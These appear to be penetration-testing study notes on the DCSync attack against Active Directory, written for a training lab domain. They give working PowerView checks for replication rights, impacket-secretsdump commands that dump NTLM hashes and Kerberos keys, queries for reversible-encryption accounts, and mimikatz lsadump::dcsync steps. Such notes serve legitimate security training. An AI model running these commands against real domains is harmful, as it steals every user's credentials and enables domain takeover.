DCSync is a technique for stealing the Active Directory password database by using the built-in `Directory Replication Service Remote Protocol`, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.

To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.

# Powerview
View user's group membership
```powershell-session
Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```

check users replication rights, it needs to have DS-Replication-Get-Changes-All in order to perform DCSync 
```
$sid = Convert-NameToSid username
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

Extracting NTLM Hashes and Kerberos Keys using secretsdump.py

```shell-session
impacket-secretsdump -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
```
all the hashes and keys and passwords are saved in the working directory

`-just-dc-ntlm` flag if we only want NTLM hashes or specify `-just-dc-user <USERNAME>`

`-pwd-last-set` to see when each account's password was last changed

`-history` if we want to dump password history,

`-user-status` see if a user is disabled.

```
impacket-secretsdump hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -just-dc-ntlm -just-dc-user bross
```

REversible Encryption Password Users
powerview
```powershell-session
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

alternative:
runas.exe as the domain administrator and then run mimikatz.exe
```
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

```
privilege::debug

lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```